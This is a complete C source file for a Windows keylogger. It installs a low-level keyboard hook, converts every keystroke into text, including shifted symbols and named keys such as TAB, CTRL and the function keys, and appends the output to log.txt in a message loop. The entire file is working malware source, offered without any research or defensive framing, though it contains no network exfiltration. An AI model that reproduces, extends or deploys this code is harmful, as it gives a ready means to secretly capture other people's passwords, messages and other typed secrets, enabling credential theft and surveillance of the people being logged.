#include <windows.h>

HHOOK hKeyboardHook = NULL;
HANDLE hOutputFile = INVALID_HANDLE_VALUE;

size_t Mystrlen(const char* str)
{
	size_t len = 0;
	while (str[len])
		++len;
	return len;
}

void* SecureMemoryCopy(void* destination, const void* source, size_t size)
{
	if (!destination || !source || !size)
	{
		return NULL;
	}
	// Copy bytes from source to destination
	char* dest = (char*)destination;
	char* src = (char*)source;
	for (size_t i = 0; i < size; ++i)
	{
		dest[i] = src[i];
	}

	return destination;
}

errno_t Mystrcpy_s(char* dest, size_t destsz, const char* src)
{
    if (!dest || !src || !destsz)
    {
        return EINVAL;
    }

    size_t srclen = Mystrlen(src);
    if (srclen >= destsz)
    {
        // Set dest to an empty string
        *dest = '\0';
        return ERANGE;
    }

    // Use the secure version of memcpy to copy src to dest
    if (!SecureMemoryCopy(dest, src, srclen))
    {
        // Set dest to an empty string
        *dest = '\0';
        return EINVAL;
    }

    dest[srclen] = '\0';
    return 0;
}

char* virtualKeyToString(int vkCode)
{
	static char buffer[256];
	RtlSecureZeroMemory(&buffer, sizeof(buffer));
	if (vkCode == 15 || vkCode >= 28 && vkCode <= 29 || vkCode == 42 || vkCode >= 54 && vkCode <= 69)
	{
		switch (vkCode)
		{
		case 15:
			Mystrcpy_s(buffer, sizeof(buffer), "[TAB]");
			break;
		case 28:
			Mystrcpy_s(buffer, sizeof(buffer), "\n");
			break;
		case 29:
			Mystrcpy_s(buffer, sizeof(buffer), "[CTRL]");
			break;
		case 42:
			Mystrcpy_s(buffer, sizeof(buffer), "[LSHIFT]");
			break;
		case 54:
			Mystrcpy_s(buffer, sizeof(buffer), "[RSHIFT]");
			break;
		case 55:
			Mystrcpy_s(buffer, sizeof(buffer), "[PRTSC]");
			break;
		case 56:
			Mystrcpy_s(buffer, sizeof(buffer), "[ALT]");
			break;
		case 57:
			Mystrcpy_s(buffer, sizeof(buffer), " ");
			break;
		case 58:
			Mystrcpy_s(buffer, sizeof(buffer), "[CAPS]");
			break;
		case 59:
			Mystrcpy_s(buffer, sizeof(buffer), "[F1]");
			break;
		case 60:
			Mystrcpy_s(buffer, sizeof(buffer), "[F2]");
			break;
		case 61:
			Mystrcpy_s(buffer, sizeof(buffer), "[F3]");
			break;
		case 62:
			Mystrcpy_s(buffer, sizeof(buffer), "[F4]");
			break;
		case 63:
			Mystrcpy_s(buffer, sizeof(buffer), "[F5]");
			break;
		case 64:
			Mystrcpy_s(buffer, sizeof(buffer), "[F6]");
			break;
		case 65:
			Mystrcpy_s(buffer, sizeof(buffer), "[F7]");
			break;
		case 66:
			Mystrcpy_s(buffer, sizeof(buffer), "[F8]");
			break;
		case 67:
			Mystrcpy_s(buffer, sizeof(buffer), "[F9]");
			break;
		case 68:
			Mystrcpy_s(buffer, sizeof(buffer), "[F10]");
			break;
		case 69:
			Mystrcpy_s(buffer, sizeof(buffer), "[NUM]");
			break;
		}
	}
	else
	{
		GetKeyNameTextA(vkCode << 16, buffer, sizeof(buffer));
	}

	return buffer;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char output[256];
	DWORD bytesWritten;
	RtlSecureZeroMemory(&output, sizeof(output));

	if (nCode == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			if (GetAsyncKeyState(VK_SHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000) // Check if shit is pressed down
			{
				if ((p->vkCode >= 48) && (p->vkCode <= 57) || (p->vkCode >= 186) && (p->vkCode <= 192)) // Keys 0-9 & Special keys {-, =, `, ., comma, /}
				{
					switch (p->vkCode)
					{
					case 0x30:
						Mystrcpy_s(output, sizeof(output), ")");
						goto write;
						break;
					case 0x31:
						Mystrcpy_s(output, sizeof(output), "!");
						goto write;
						break;
					case 0x32:
						Mystrcpy_s(output, sizeof(output), "@");
						goto write;
						break;
					case 0x33:
						Mystrcpy_s(output, sizeof(output), "#");
						goto write;
						break;
					case 0x34:
						Mystrcpy_s(output, sizeof(output), "$");
						goto write;
						break;
					case 0x35:
						Mystrcpy_s(output, sizeof(output), "%%");
						goto write;
						break;
					case 0x36:
						Mystrcpy_s(output, sizeof(output), "^");
						goto write;
						break;
					case 0x37:
						Mystrcpy_s(output, sizeof(output), "&");
						goto write;
						break;
					case 0x38:
						Mystrcpy_s(output, sizeof(output), "*");
						goto write;
						break;
					case 0x39:
						Mystrcpy_s(output, sizeof(output), "(");
						goto write;
						break;
					case 0xBA:
						Mystrcpy_s(output, sizeof(output), ":");
						goto write;
						break;
					case 0xBB:
						Mystrcpy_s(output, sizeof(output), "+");
						goto write;
						break;
					case 0xBC:
						Mystrcpy_s(output, sizeof(output), "<");
						goto write;
						break;
					case 0xBD:
						Mystrcpy_s(output, sizeof(output), "_");
						goto write;
						break;
					case 0xBE:
						Mystrcpy_s(output, sizeof(output), ">");
						goto write;
						break;
					case 0xBF:
						Mystrcpy_s(output, sizeof(output), "?");
						goto write;
						break;
					case 0xC0:
						Mystrcpy_s(output, sizeof(output), "~");
						goto write;
						break;
					}
				}
				else
				{
					Mystrcpy_s(output, sizeof(output), virtualKeyToString(MapVirtualKeyA(p->vkCode, 0)));
					//snprintf(output, sizeof(output), "%s", virtualKeyToString(MapVirtualKeyA(p->vkCode, 0)));
					if (output[0] >= 'a' && output[0] <= 'z') output[0] -= 32; // convert to uppercase
					write:
						WriteFile(hOutputFile, output, (DWORD)strlen(output), &bytesWritten, NULL);
				}
				break;
			}
			else
			{
				Mystrcpy_s(output, sizeof(output), virtualKeyToString(MapVirtualKeyA(p->vkCode, 0)));
				//snprintf(output, sizeof(output), "%s", virtualKeyToString(MapVirtualKeyA(p->vkCode, 0)));
				if(output[0] >= 'A' && output[0] <= 'Z') output[0]+=32; // convert to lowercase
				WriteFile(hOutputFile, output, (DWORD)strlen(output), &bytesWritten, NULL);
				break;
			}
		case WM_KEYUP:
		case WM_SYSKEYUP:
			break;
		}
	}

	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int myMain()
{
	char buffer[256];

	hOutputFile = CreateFileA("log.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
		Mystrcpy_s(buffer, sizeof(buffer), "[-] Failed to create output file!");
		MessageBoxA(NULL, buffer, "Error", MB_ICONERROR | MB_OK);
		return -1;
	}

	hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (hKeyboardHook == NULL)
	{
		Mystrcpy_s(buffer, sizeof(buffer), "[-] Failed to install keyboard hook!");
		MessageBoxA(NULL, buffer, "Error", MB_ICONERROR | MB_OK);
		return -1;
	}

	MessageBoxA(NULL, "[+] Keyboard hook installed.", "Success", MB_ICONINFORMATION | MB_OK);

	MSG message;
	while (GetMessageA(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessageA(&message);
	}

	UnhookWindowsHookEx(hKeyboardHook);
	CloseHandle(hOutputFile);

	return 0;
}